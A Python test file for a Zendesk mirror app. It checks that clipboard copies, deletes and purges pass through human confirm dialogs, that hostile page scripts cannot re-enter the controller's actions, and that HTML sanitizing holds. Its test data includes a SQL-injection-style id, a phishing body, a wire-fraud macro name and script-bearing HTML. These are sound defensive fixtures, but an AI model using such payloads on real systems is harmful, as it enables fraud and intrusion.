    for field in ("title", "body_html", "body_rich"):
        ctrl.js_copy_field("article_draft", str(did), field)
    assert calls == [] and seen["copies"] == []
    assert "only be copied from the app window" in seen["status"][-1]

    # and with a confirm wired, the human is shown the phishing body itself
    calls2 = []
    ctrl2, seen2, confirms = _gated(empty_db, answer=False,
                                    clipboard_fn=_clipboard(calls2))
    _serve_revisions(ctrl2)
    ctrl2.js_request_diff("article", str(did))
    ctrl2.js_copy_field("article_draft", str(did), "body_html")
    assert calls2 == [] and seen2["copies"] == []
    blob = _confirm_blob(confirms)
    assert "SSN" in blob and "1-555-0142" in blob


def test_e1_macro_rename_is_one_transaction(empty_db):
    """E1, as the data-integrity bug it is.

    js_save_draft's macro branch used to commit `name` and then `description`
    separately. json.loads happily produces a lone unpaired surrogate, which
    sqlite3 refuses to bind — so the second write raised AFTER the first had
    committed and the page's chosen NAME was live in the DB from a save that
    reported nothing. One transaction: applied whole or not at all."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    did = zendesk_store.save_macro_draft(
        conn, name="Refund apology", macro_id=201, rationale="r",
        description="sorry note",
        actions=[{"field": "comment_value", "value": "Hi there"}])
    _serve_revisions(ctrl)

    evil_name = ("Refund apology -- WIRE FUNDS TO acct 4471-9920 "
                 "BEFORE REFUND")
    # '\ud800' survives json.loads and dies at the sqlite bind
    payload = json.dumps({"name": evil_name, "description": "\ud800"})
    assert json.loads(payload)["description"] == "\ud800"
    ctrl.js_save_draft("macro", str(did), payload)

    row = zendesk_store.get_macro_draft(conn, did)
    assert row["name"] == "Refund apology"          # rolled back, not partial
    assert row["description"] == "sorry note"
    assert conn.in_transaction is False             # no wedged transaction

    # the tab survives and a well-formed rename still works
    ctrl.js_save_draft("macro", str(did),
                       json.dumps({"name": "Refund apology v2",
                                   "description": "kinder note"}))
    row = zendesk_store.get_macro_draft(conn, did)
    assert row["name"] == "Refund apology v2"
    assert row["description"] == "kinder note"

    # ...and the clipboard still demands the confirm for the new bytes
    ctrl.js_request_diff("macro", str(did))
    ctrl.js_mark_ready("macro", str(did))
    ctrl.js_copy_field("macro_draft", str(did), "macro_name")
    assert calls == [("Refund apology v2", None)]
    assert len(confirms) == 1


def test_the_provenance_ledger_is_gone(empty_db):
    """The failing mechanism was REMOVED, not patched again. If a future
    change reintroduces an authorship ledger, this test says so out loud —
    the whole point of E2 is that authorship cannot be known here."""
    ctrl, _seen = _controller(empty_db)
    for attr in ("_page_authored", "_mark_page_authored",
                 "_page_authored_now"):
        assert not hasattr(ctrl, attr), f"{attr} is back"
    src = (REPO / "src" / "services" / "zendesk_web.py").read_text(
        encoding="utf-8")
    assert "page_authored" not in src


def test_draft_copy_confirm_runs_the_destructive_gate_discipline(empty_db):
    """Same belts as delete/purge: the single-winner claim is held while the
    modal's nested event loop spins (so a re-entrant page script finds every
    mutating slot frozen), a raising dialog means NO, and bytes that move
    under the modal are refused."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    holder, calls = {}, []
    seen_state = []

    def reenter():
        c = holder["c"]
        seen_state.append(c._action_inflight)
        c.js_save_draft("article", str(holder["did"]),
                        json.dumps({"title": "RE-ENTERED"}))
        c.js_request_pull()
        return True

    ctrl, seen, confirms = _gated(empty_db, answer=reenter,
                                  clipboard_fn=_clipboard(calls))
    holder["c"] = ctrl
    did = _served_article_draft(conn, ctrl)
    holder["did"] = did
    ctrl.js_save_draft("article", str(did), json.dumps({"title": "PAGE"}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "title")
    assert seen_state == [True]                    # claim held under the modal
    assert calls == [("PAGE", None)]               # the re-entrant rename lost
    assert zendesk_store.get_article_draft(conn, did)["title"] == "PAGE"
    assert seen["pulls"] == []
    assert ctrl._action_inflight is False          # released

    # a dialog that raises means NO
    def boom():
        raise RuntimeError("broken dialog")
    ctrl2, seen2, _c2 = _gated(empty_db, answer=boom,
                               clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl2)
    ctrl2.js_save_draft("article", str(did), json.dumps({"title": "PAGE2"}))
    ctrl2.js_request_diff("article", str(did))
    n = len(calls)
    ctrl2.js_copy_field("article_draft", str(did), "title")
    assert len(calls) == n

    # bytes that move WHILE the modal is open are refused after the approve
    def approve_after_rewrite():
        zendesk_store.update_article_draft(conn, did, title="SWAPPED")
        return True
    ctrl3, seen3, _c3 = _gated(empty_db, answer=approve_after_rewrite,
                               clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl3)
    ctrl3.js_save_draft("article", str(did), json.dumps({"title": "PAGE3"}))
    ctrl3.js_request_diff("article", str(did))
    ctrl3.js_copy_field("article_draft", str(did), "title")
    assert len(calls) == n
    assert "changed while the confirm was open" in seen3["status"][-1]


def test_confirm_bytes_survive_a_legacy_two_arg_confirm(empty_db):
    """A host whose confirm takes only (title, text) must still SHOW the
    bytes — they move into the message rather than being dropped. The arity
    is decided by introspection, so the dialog is never opened twice."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls, confirms = [], []

    def two_arg_confirm(title, text):
        confirms.append((title, text))
        return True

    ctrl, seen = _controller(empty_db, confirm_fn=two_arg_confirm,
                             clipboard_fn=_clipboard(calls))
    did = _served_article_draft(conn, ctrl)
    long_body = "Paste this everywhere. " + ("x" * 900)
    ctrl.js_save_body_edit("draft", str(did),
                           json.dumps({"body": long_body}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert len(confirms) == 1                       # opened exactly once
    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
    assert stored in confirms[0][1]                 # bytes still displayed
    assert calls == [(stored, None)]


def test_short_bytes_go_inline_long_bytes_go_to_the_detail_pane(empty_db):
    """Presentation contract of the confirm: short payloads are in the
    message itself, long ones ride the scrollable detail pane — never
    truncated, never absent."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    did = _served_article_draft(conn, ctrl)
    ctrl.js_save_draft("article", str(did), json.dumps({"title": "Short one"}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "title")
    title, text, detail = confirms[-1]
    assert detail is None and "Short one" in text

    zendesk_store.set_draft_status(conn, "article", did, "pending")
    long_body = "L" * 5000
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": long_body}))
    ctrl.js_request_diff("article", str(did))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    title, text, detail = confirms[-1]
    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
    assert detail is not None and stored in detail
    assert long_body[:200] not in text          # the bytes are NOT in the head


# ── (c) RENDER FIDELITY: the preview profile vs the clipboard ────────
#
# Owner correction: "rendering the article as is (even with custom classes)
# is an ideal product experience ... given it outlines how the content would
# render in zendesk and for an end-user". The preview therefore keeps
# presentational markup (classes/ids/data-attrs/style/tables/iframes — all
# inert inside sandbox="") while the CLIPBOARD keeps the strict profile, and
# the markup notice fires only when something genuinely cannot be displayed.

PULLED_ZENDESK_HTML = (
    '<div class="article-body" data-theme="copenhagen" id="art-101">'
    '<h2 class="hc-heading">Steps</h2>'
    '<p style="text-align:center;margin-bottom:12px">Log in.</p>'
    '<table class="hc-table" border="1" cellpadding="6">'
    '<colgroup><col width="120"></colgroup>'
    '<tr><td colspan="2" style="background-color:#f8f9f9">Plan</td></tr>'
    '</table>'
    '<section><details><summary>More</summary><p>Detail.</p></details>'
    '</section>'
    '<iframe src="https://player.vimeo.com/video/1" width="560" '
    'height="315"></iframe></div>')


def test_pulled_article_preview_keeps_presentational_markup(empty_db):
    """A realistic pulled article renders faithfully AND raises no notice —
    the whole point of the owner correction. Under the strict profile every
    one of these attributes vanished and the red banner fired on every
    article, which trains people to ignore it."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 801, "title": "Pulled", "body_html": PULLED_ZENDESK_HTML,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()
    _review_article(ctrl, 801)
    detail = seen["article"][-1]
    doc = detail["body_srcdoc"]
    for kept in ('class="article-body"', 'data-theme="copenhagen"',
                 'id="art-101"', "text-align: center", 'border="1"',
                 'colspan="2"', "<colgroup", "<section", "<details",
                 "player.vimeo.com"):
        assert kept in doc, kept
    # Help Center article CSS ships in the srcdoc
    assert "<style>" in doc and ".alma-hc-article" in doc
    # nothing was lost, so no warning
    assert detail["markup_notice"] == ""
    # the STRICT profile would have thrown most of it away — the two
    # profiles are genuinely different, and only the preview widened
    assert 'data-theme="copenhagen"' not in sanitize_html(PULLED_ZENDESK_HTML)
    assert "<iframe" not in sanitize_html(PULLED_ZENDESK_HTML)


def test_preview_still_strips_scripts_handlers_and_active_urls(empty_db):
    """Widening the preview did not widen what executes: scripts, event
    handlers and javascript: URLs are still gone, and now they are the ONLY
    things that raise the notice."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 802, "title": "Hostile", "body_html": HOSTILE_HTML,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()
    _review_article(ctrl, 802)
    detail = seen["article"][-1]
    doc = detail["body_srcdoc"].lower()
    assert "<script" not in doc and "onerror" not in doc
    assert "javascript:" not in doc
    assert "purgemirror" not in doc            # the script BODY is gone too
    assert "preview does not display" in detail["markup_notice"]
    # the exact stored bytes are still shown verbatim for the source panel
    assert detail["body_source"] == HOSTILE_HTML


def test_clipboard_never_uses_the_preview_profile(empty_db):
    """The load-bearing separation: the rich (text/html) clipboard flavour
    is strict-sanitized even though the preview would have kept far more.
    A wider preview must never become a wider paste."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 803, "title": "Pulled", "body_html": PULLED_ZENDESK_HTML,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 803)
    ctrl.js_copy_field("article", "803", "body_rich")
    text, html = calls[-1]
    assert text == PULLED_ZENDESK_HTML                  # plain stays verbatim
    assert html == sanitize_html(PULLED_ZENDESK_HTML)   # STRICT, not preview
    assert "<iframe" not in html and "data-theme" not in html
    assert seen["copies"][-1]["sanitized"] is True


def test_preview_profile_is_additive_strict_is_untouched():
    """The strict allowlist is not derived from the preview one and did not
    move: this is what keeps a preview widening out of the stored-content
    and clipboard paths."""
    from src.data import html_sanitize as hs
    assert hs.PREVIEW_ALLOWED_TAGS > hs.ALLOWED_TAGS     # strict superset
    assert "iframe" in hs.PREVIEW_ALLOWED_TAGS
    assert "iframe" in hs.DROP_WITH_CONTENT              # strict: dropped
    assert "script" in hs.PREVIEW_DROP_WITH_CONTENT
    # the strict profile still refuses everything it always refused
    assert sanitize_html('<p class="x" id="y" data-z="1">hi</p>') == \
        '<p class="x">hi</p>'


# ── destructive gates: delete_revision ───────────────────────────────

def test_delete_revision_approve_once_dispatches(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen, confirms = _gated(empty_db, answer=True)
    _serve_revisions(ctrl)
    ctrl.js_delete_revision("article", str(did))
    assert len(confirms) == 1
    assert confirms[0][1] == "Delete this revision? This cannot be undone."
    assert zendesk_store.get_article_draft(conn, did) is None
    res = seen["actions"][-1]
    assert res["action"] == "delete_revision" and res["ok"] is True
    assert res["approved"] is True and res["error"] is None
    assert seen["revisions"][-1]["revisions"] == []    # repushed post-delete


def test_delete_revision_cancel_never_deletes(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen, confirms = _gated(empty_db, answer=False)
    _serve_revisions(ctrl)
    ctrl.js_delete_revision("article", str(did))
    assert len(confirms) == 1
    assert zendesk_store.get_article_draft(conn, did) is not None
    res = seen["actions"][-1]
    assert res["ok"] is False and res["approved"] is False


def test_delete_revision_no_confirm_fn_fails_closed(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)                 # no confirm_fn at all
    _serve_revisions(ctrl)
    ctrl.js_delete_revision("article", str(did))
    assert zendesk_store.get_article_draft(conn, did) is not None
    assert seen["actions"][-1]["approved"] is False


def test_delete_revision_confirm_raises_means_no(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    def boom():
        raise RuntimeError("broken dialog")
    ctrl, seen, _ = _gated(empty_db, answer=boom)
    _serve_revisions(ctrl)
    ctrl.js_delete_revision("article", str(did))
    assert zendesk_store.get_article_draft(conn, did) is not None
    assert seen["actions"][-1]["approved"] is False


def test_delete_revision_forged_stale_malformed_silent(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen, confirms = _gated(empty_db, answer=True)
    for kind, did in (("article", "999"), ("bogus", "1"), ("article", "abc"),
                      ("article", ""), ("article", None),
                      ("article", "1; DROP TABLE")):
        ctrl.js_delete_revision(kind, did)
    assert confirms == [] and seen["actions"] == []


def test_delete_revision_store_raises_resolves_undispatched(empty_db,
                                                           monkeypatch):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen, _ = _gated(empty_db, answer=True)
    _serve_revisions(ctrl)
    def boom(*a, **k):
        raise RuntimeError("db locked")
    monkeypatch.setattr(zendesk_store, "delete_draft", boom)
    ctrl.js_delete_revision("article", str(did))
    res = seen["actions"][-1]
    assert res["ok"] is False and res["error"] == "store_error"
    assert zendesk_store.get_article_draft(conn, did) is not None
    assert ctrl._action_inflight is False              # claim released


def test_delete_revision_reverify_catches_status_change(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    def approve_after_flip():
        # the draft moved on while the modal was open (e.g. the MCP path)
        zendesk_store.set_draft_status(conn, "article", did, "ready")
        return True
    ctrl, seen, _ = _gated(empty_db, answer=approve_after_flip)
    _serve_revisions(ctrl)
    ctrl.js_delete_revision("article", str(did))
    res = seen["actions"][-1]
    assert res["ok"] is False and res["error"] == "status_changed"
    assert zendesk_store.get_article_draft(conn, did) is not None


def test_delete_revision_single_winner_reentrancy(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    d1 = zendesk_store.save_article_draft(
        conn, title="A", body="B", article_id=101, rationale="r")
    d2 = zendesk_store.save_article_draft(
        conn, title="C", body="D", article_id=102, rationale="r")
    ctrl = {}
    def reenter():
        # a page script invoking bridge slots while the modal's nested event
        # loop spins — every mutating slot must find the claim held
        c = ctrl["c"]
        c.js_delete_revision("article", str(d2))
        c.js_purge_mirror("all")
        c.js_mark_ready("article", str(d2))
        c.js_save_draft("article", str(d2), json.dumps({"title": "X"}))
        c.js_save_body_edit("draft", str(d2), json.dumps({"body": "EVIL"}))
        c.js_request_pull()
        c.js_request_import()
        return True
    c, seen, confirms = _gated(empty_db, answer=reenter)
    ctrl["c"] = c
    _serve_revisions(c)
    c.js_delete_revision("article", str(d1))
    assert len(confirms) == 1                          # one modal, one winner
    assert len(seen["actions"]) == 1
    assert seen["actions"][0]["draft_id"] == d1
    assert zendesk_store.get_article_draft(conn, d2) is not None
    assert zendesk_store.get_article_draft(conn, d2)["title"] == "C"
    assert zendesk_store.get_article_draft(conn, d2)["body"] == "D"
    assert seen["pulls"] == [] and seen["imports"] == []


# ── destructive gates: purge_mirror ──────────────────────────────────

def test_purge_scope_all_text_and_recomputed_counts(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    copied = zendesk_store.save_macro_draft(
        conn, name="M", actions=[], macro_id=201, rationale="r")
    zendesk_store.set_draft_status(conn, "macro", copied, "copied")
    def approve_and_grow():
        # the pre-modal count is stale by dispatch time — a new article lands
        # while the modal is open; the resolved counts must be recomputed
        zendesk_store.upsert_articles(conn, [
            {"id": 999, "title": "Late", "body_html": "<p>x</p>",
             "updated_at": "2026-07-03T00:00:00Z"}])
        return True
    ctrl, seen, confirms = _gated(empty_db, answer=approve_and_grow)
    ctrl.js_purge_mirror("all")
    title, text, _detail = confirms[0]
    assert "2 articles" in text and "2 macros" in text
    assert "1 pending/ready revisions" in text
    assert "Copied/pushed revisions are kept" in text
    res = seen["actions"][-1]
    assert res["action"] == "purge_mirror" and res["ok"] is True
    assert res["counts"]["articles"] == 3              # recomputed, not stale
    assert res["counts"]["macros"] == 2
    assert res["counts"]["article_drafts"] == 1
    # the audit trail survives scope='all'
    assert zendesk_store.get_macro_draft(conn, copied) is not None
    assert zendesk_store.get_article_draft(conn, did) is None


def test_purge_cancel_and_invalid_scope(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    ctrl, seen, confirms = _gated(empty_db, answer=False)
    ctrl.js_purge_mirror("articles")
    assert "mirrored articles" in confirms[0][1]
    assert conn.execute(
        "SELECT COUNT(*) FROM zendesk_articles").fetchone()[0] == 2
    assert seen["actions"][-1]["approved"] is False
    ctrl.js_purge_mirror("everything")                 # allowlist → silent
    assert len(confirms) == 1 and len(seen["actions"]) == 1


# ── pull / import claims, cooldown, freeze ───────────────────────────

def test_pull_runner_absent_resolves_not_started(empty_db):
    ctrl, seen = _controller(empty_db)                 # no pull_runner
    ctrl.js_request_pull()
    assert seen["pulls"] == [{"ok": False, "error": "not_started"}]
    assert ctrl._pull_inflight is False                # claim released


def test_pull_runner_false_or_raising_releases(empty_db):
    ctrl, seen = _controller(empty_db, pull_runner=lambda: False)
    ctrl.js_request_pull()
    assert seen["pulls"][-1] == {"ok": False, "error": "not_started"}
    assert ctrl._pull_inflight is False
    def boom():
        raise RuntimeError("thread failed")
    ctrl2, seen2 = _controller(empty_db, pull_runner=boom)
    ctrl2.js_request_pull()
    assert seen2["pulls"][-1] == {"ok": False, "error": "not_started"}
    assert ctrl2._pull_inflight is False


def test_pull_lifecycle_freeze_and_cooldown(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    clock = {"t": 1000.0}
    started = []
    ctrl, seen = _controller(
        empty_db, pull_runner=lambda: started.append(1) or True,
        now_fn=lambda: clock["t"])
    _serve_revisions(ctrl)
    ctrl.js_request_pull()
    assert started == [1] and ctrl._pull_inflight is True
    # mutation freeze while the pull claim is held
    ctrl.js_mark_ready("article", str(did))
    assert zendesk_store.get_article_draft(conn, did)["status"] == "pending"
    ctrl.js_request_pull()                             # second pull refused
    assert started == [1]
    report = {"ok": True, "articles": 2, "macros": 2, "sections": 1,
              "categories": 1, "truncated": False}
    ctrl.notify_pull_done(report)
    assert ctrl._pull_inflight is False
    assert seen["pulls"][-1] == report                 # report verbatim
    assert seen["data"]                                # mirror re-served
    # cooldown floor: within 60s of completion → silent refusal
    clock["t"] += 30
    ctrl.js_request_pull()
    assert started == [1] and seen["pulls"][-1] == report
    clock["t"] += 31                                   # 61s after completion
    ctrl.js_request_pull()
    assert started == [1, 1]
    ctrl.notify_pull_done({"ok": True})


def test_failed_pull_arms_only_short_cooldown(empty_db):
    """Minor regression: a FAILED pull must not lock the user out for the
    full 60s window — the retry is allowed after the short (5s) floor,
    while an OK pull still arms the full 60s cooldown."""
    clock = {"t": 1000.0}
    started = []
    ctrl, seen = _controller(
        empty_db, pull_runner=lambda: started.append(1) or True,
        now_fn=lambda: clock["t"])
    ctrl.js_request_pull()
    ctrl.notify_pull_done({"ok": False, "error": "network"})
    # inside the short floor: still refused (bounded burst)
    clock["t"] += 2
    ctrl.js_request_pull()
    assert started == [1]
    # a user retry moments later goes through
    clock["t"] += 4                                # 6s after the failure
    ctrl.js_request_pull()
    assert started == [1, 1]
    ctrl.notify_pull_done({"ok": True})
    # ok pull → full 60s window again
    clock["t"] += 30
    ctrl.js_request_pull()
    assert started == [1, 1]
    clock["t"] += 31
    ctrl.js_request_pull()
    assert started == [1, 1, 1]
    ctrl.notify_pull_done({"ok": True})


def test_connected_probe_refreshes_on_pull_and_refresh(empty_db, monkeypatch):
    """Minor regression: the connected/mirror-only probe is re-run when a
    pull resolves and on js_refresh/request_refresh — connecting credentials
    in Settings must not show 'Mirror only' until an app restart."""
    probe = {"value": False, "calls": 0}
    def fake_probe():
        probe["calls"] += 1
        return probe["value"]
    monkeypatch.setattr(zendesk_web, "_probe_connected", fake_probe)
    ctrl, seen = _controller(empty_db, pull_runner=lambda: True)
    ctrl.js_refresh()
    assert seen["data"][-1]["connected"] is False
    probe["value"] = True                          # creds added in Settings
    ctrl.js_refresh()                              # page refresh re-probes
    assert seen["data"][-1]["connected"] is True
    probe["value"] = False                         # creds removed again
    ctrl.js_request_pull()
    ctrl.notify_pull_done({"ok": True})            # pull resolution re-probes
    assert seen["data"][-1]["connected"] is False
    probe["value"] = True
    ctrl.request_refresh()                         # host-driven re-serve too
    assert seen["data"][-1]["connected"] is True


def test_import_claim_held_before_picker_reentrancy(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    holder = {}
    ran = []
    def picker():
        # the native QFileDialog spins a nested event loop; a bridge invoke
        # from inside it must find every mutating slot frozen
        c = holder["c"]
        assert c._pull_inflight is True
        c.js_mark_ready("article", str(did))
        c.js_request_pull()
        c.js_delete_revision("article", str(did))
        c.js_request_import()
        return ["C:/exports/articles.json"]
    ctrl, seen = _controller(
        empty_db, file_pick_fn=picker,
        import_runner=lambda paths: ran.append(list(paths)) or True,
        confirm_fn=lambda *a: True)
    holder["c"] = ctrl
    _serve_revisions(ctrl)
    ctrl.js_request_import()
    assert ran == [["C:/exports/articles.json"]]
    assert ctrl._pull_inflight is True                 # held through runner
    assert zendesk_store.get_article_draft(conn, did)["status"] == "pending"
    assert seen["actions"] == []                       # delete never gated in
    report = {"ok": True, "files": [], "totals": {}}
    ctrl.notify_import_done(report)
    assert ctrl._pull_inflight is False
    assert seen["imports"][-1] == report


def test_import_cancel_releases_claim_silently(empty_db):
    ctrl, seen = _controller(empty_db, file_pick_fn=lambda: [],
                             import_runner=lambda p: True)
    ctrl.js_request_import()
    assert seen["imports"] == [] and ctrl._pull_inflight is False
    # folder variant: None → cancel too
    ctrl2, seen2 = _controller(empty_db, folder_pick_fn=lambda: None,
                               import_runner=lambda p: True)
    ctrl2.js_request_import_folder()
    assert seen2["imports"] == [] and ctrl2._pull_inflight is False


def test_import_runner_absent_or_false_not_started(empty_db):
    ctrl, seen = _controller(empty_db,
                             file_pick_fn=lambda: ["C:/x.json"])  # no runner
    ctrl.js_request_import()
    assert seen["imports"][-1] == {"ok": False, "error": "not_started"}
    assert ctrl._pull_inflight is False
    ctrl2, seen2 = _controller(empty_db)               # no picker at all
    ctrl2.js_request_import()
    assert seen2["imports"][-1] == {"ok": False, "error": "not_started"}
    assert ctrl2._pull_inflight is False
    ctrl3, seen3 = _controller(
        empty_db, folder_pick_fn=lambda: "C:/folder",
        import_runner=lambda p: False)
    ctrl3.js_request_import_folder()
    assert seen3["imports"][-1] == {"ok": False, "error": "not_started"}
    assert ctrl3._pull_inflight is False


# ── compat surface + the structural no-write guarantee ───────────────

def test_compat_surface_exists(empty_db):
    ctrl, _ = _controller(empty_db)
    for attr in ("sync_requested", "article_selected", "article_saved",
                 "article_push", "macro_selected", "macro_saved",
                 "macro_push", "set_articles", "show_article_draft",
                 "set_macros", "show_macro_draft", "set_status",
                 "notify_pull_done", "notify_import_done", "request_refresh"):
        assert hasattr(ctrl, attr), attr


def test_push_and_sync_signals_never_emitted(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(
        empty_db, confirm_fn=lambda *a: True,
        clipboard_fn=lambda t, h: True, pull_runner=lambda: True,
        file_pick_fn=lambda: ["C:/x.json"], import_runner=lambda p: True)
    # exercise the full surface
    ctrl.js_refresh()
    ctrl.js_open_article("101")
    ctrl.js_open_macro("201")
    _serve_revisions(ctrl)
    ctrl.js_save_draft("article", str(did), json.dumps({"title": "T2"}))
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article", "101", "title")
    ctrl.js_request_diff("article", str(did))
    ctrl.js_delete_revision("article", str(did))
    ctrl.js_request_pull()
    ctrl.notify_pull_done({"ok": True})
    ctrl.set_articles(2, [])
    ctrl.set_macros(2, [])
    ctrl.set_status("hello")
    assert seen["pushes"] == []
    # and structurally: the source never emits them
    src = (REPO / "src" / "services" / "zendesk_web.py").read_text(
        encoding="utf-8")
    for token in ("article_push.emit", "macro_push.emit",
                  "sync_requested.emit"):
        assert token not in src, token


def test_controller_source_never_references_client_writes():
    """The mirror-only guarantee, grep-style: no ZendeskClient write method
    (or the private _write transport) is ever referenced. update/create of
    *drafts* (local store rows) are the only allowed near-misses."""
    src = (REPO / "src" / "services" / "zendesk_web.py").read_text(
        encoding="utf-8")
    banned = re.compile(
        r"create_article|create_macro|update_article(?!_draft)"
        r"|update_macro(?!_draft)|_write\b|publish_article_draft"
        r"|publish_macro_draft")
    hit = banned.search(src)
    assert hit is None, f"forbidden reference {hit.group(0)!r} in zendesk_web.py"


def test_status_line_echo(empty_db):
    ctrl, seen = _controller(empty_db)
    ctrl.set_status("Synced 5 articles")
    assert seen["status"] == ["Synced 5 articles"]
    ctrl.js_refresh()
    assert seen["data"][-1]["status"] == "Synced 5 articles"


# ── bridge: pure relay ───────────────────────────────────────────────

def test_bridge_relays_signals_and_slots(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)
    calls = []
    bridge = ZendeskBridge(
        data_signal=ctrl.zendesk_data, article_signal=ctrl.article_detail,
        macro_signal=ctrl.macro_detail, revisions_signal=ctrl.revisions_data,
        diff_signal=ctrl.diff_ready, import_signal=ctrl.import_resolved,
        pull_signal=ctrl.pull_resolved, copy_signal=ctrl.copy_resolved,
        action_signal=ctrl.action_resolved, status_signal=ctrl.status_text,
        refresh_fn=ctrl.js_refresh, view_fn=ctrl.js_set_view,
        open_article_fn=ctrl.js_open_article, open_macro_fn=ctrl.js_open_macro,
        search_fn=ctrl.js_search, revisions_fn=ctrl.js_request_revisions,
        diff_fn=ctrl.js_request_diff, save_fn=ctrl.js_save_draft,
        save_body_edit_fn=lambda *a: calls.append(("bodyedit",) + a),
        ready_fn=ctrl.js_mark_ready, copied_fn=ctrl.js_mark_copied,
        copy_fn=ctrl.js_copy_field, import_fn=ctrl.js_request_import,
        import_folder_fn=ctrl.js_request_import_folder,
        pull_fn=lambda: calls.append("pull"),
        delete_fn=ctrl.js_delete_revision, purge_fn=ctrl.js_purge_mirror)
    got = {"data": [], "article": [], "revisions": [], "status": []}
    bridge.zendeskData.connect(lambda j: got["data"].append(json.loads(j)))
    bridge.articleDetail.connect(lambda j: got["article"].append(json.loads(j)))
    bridge.revisionsData.connect(lambda j: got["revisions"].append(json.loads(j)))
    bridge.statusText.connect(lambda t: got["status"].append(t))
    bridge.refresh()
    assert got["data"] and got["data"][-1]["counts"]["articles"] == 2
    bridge.openArticle("101")
    assert got["article"][-1]["id"] == 101
    bridge.requestRevisions("all")
    assert got["revisions"][-1]["filter"] == "all"
    bridge.requestPull()
    assert calls == ["pull"]
    # saveBodyEdit relays the three string args verbatim
    bridge.saveBodyEdit("draft", "7", '{"body":"x"}')
    assert calls[-1] == ("bodyedit", "draft", "7", '{"body":"x"}')
    ctrl.set_status("hi")
    assert got["status"] == ["hi"]
    assert bridge.ping() == "pong"


def test_bridge_inert_uninjected_and_swallows_raises():
    inert = ZendeskBridge()
    inert.refresh(); inert.setView("articles"); inert.openArticle("1")
    inert.openMacro("1"); inert.search("q", "all"); inert.requestRevisions("open")
    inert.requestDiff("article", "1"); inert.saveDraft("article", "1", "{}")
    inert.saveBodyEdit("draft", "1", "{}")
    inert.markReady("article", "1"); inert.markCopied("article", "1")
    inert.copyField("article", "1", "title"); inert.requestImport()
    inert.requestImportFolder(); inert.requestPull()
    inert.deleteRevision("article", "1"); inert.purgeMirror("all")
    assert inert.ping() == "pong"
    def boom(*a):
        raise RuntimeError("hostile callable")
    angry = ZendeskBridge(refresh_fn=boom, save_fn=boom, purge_fn=boom,
                          copy_fn=boom, pull_fn=boom, save_body_edit_fn=boom)
    angry.refresh(); angry.saveDraft("a", "1", "{}"); angry.purgeMirror("all")
    angry.copyField("article", "1", "title"); angry.requestPull()
    angry.saveBodyEdit("draft", "1", "{}")
    assert angry.ping() == "pong"


def test_bridge_source_is_pure_relay():
    src = (REPO / "src" / "ui" / "web" / "zendesk_bridge.py").read_text(
        encoding="utf-8")
    assert "src.services" not in src        # never imports the controller
    assert "import json" not in src         # no payload introspection
    assert "sqlite3" not in src             # no data access
    assert "zendesk_store" not in src


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-q"]))
